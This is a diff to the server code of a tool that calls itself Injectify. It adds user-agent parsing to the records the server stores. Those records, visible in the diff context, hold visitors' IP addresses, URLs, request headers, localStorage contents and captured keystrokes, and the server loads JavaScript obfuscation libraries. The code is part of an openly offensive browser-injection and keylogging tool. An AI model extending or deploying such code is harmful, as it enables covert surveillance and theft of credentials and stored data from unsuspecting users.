@@ -27,6 +27,7 @@ const UglifyJS		= require("uglify-js")
 const ObfuscateJS	= require('js-obfuscator')
 const reverse		= require('reverse-string')
 const escapeUTF8	= require('unicode-escape')
+const parseAgent	= require('user-agent-parser')
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -615,9 +616,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 													url			: record[url],
 													ip			: ip,
 													browser: {
-														width	: record[width],
-														height	: record[height],
-														headers	: req.headers
+														width		: record[width],
+														height		: record[height],
+														'user-agent': parseAgent(req.headers["user-agent"]),
+														headers		: req.headers
 													},
 													storage : {
 														local	: record[localStorage],
@@ -679,7 +681,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 																timestamp	: timestamp,
 																ip			: ip,
 																browser: {
-																	headers	: req.headers
+																	headers		: req.headers,
+																	'user-agent': parseAgent(req.headers["user-agent"])
 																},
 																keys : [
 																	keystrokes
